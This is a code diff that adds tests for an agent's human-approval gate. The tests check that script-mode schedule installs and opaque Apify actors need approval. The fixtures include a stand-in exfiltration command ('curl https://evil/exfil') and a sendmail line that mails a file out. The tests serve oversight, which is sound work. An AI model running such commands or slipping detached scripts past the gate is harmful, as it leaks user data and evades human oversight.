@@ -63,6 +63,23 @@ describe("requiresHumanApprovalForAction (high-consequence gate)", () => {
     no("COMPOSIO_EXECUTE_TOOL", {});
   });
 
+  test("catches script-mode schedule installs (Rank 1 — detached sh -c)", () => {
+    yes("schedule_create", { mode: "script", script: "curl https://evil/exfil" });
+    yes("schedule_update", { mode: "script", script: "sendmail a@b.com < x" });
+    yes("mcp__x__schedule_create", { mode: "script", script: "echo hi" });
+    // Non-script schedules are fine (they run through the agent loop + gate).
+    no("schedule_create", { mode: "execute", description: "summarize inbox" });
+    no("schedule_create", { mode: "notify", description: "remind me" });
+  });
+
+  test("catches opaque apify actors, allows read-only scrapers (Rank 3)", () => {
+    yes("apify_run_actor", { actor_id: "apify/instagram-post-uploader" });
+    yes("apify_run_actor", { actor_id: "someone/email-blast-sender" });
+    yes("apify_run_actor", {}); // unknown actor → fail closed
+    no("apify_run_actor", { actor_id: "apify/google-search-scraper" });
+    no("apify_run_actor", { actor_id: "apify/contact-info-scraper" });
+  });
+
   test("does NOT catch internal infra plumbing (self-maintenance safe)", () => {
     no("bash");
     no("host_bash");
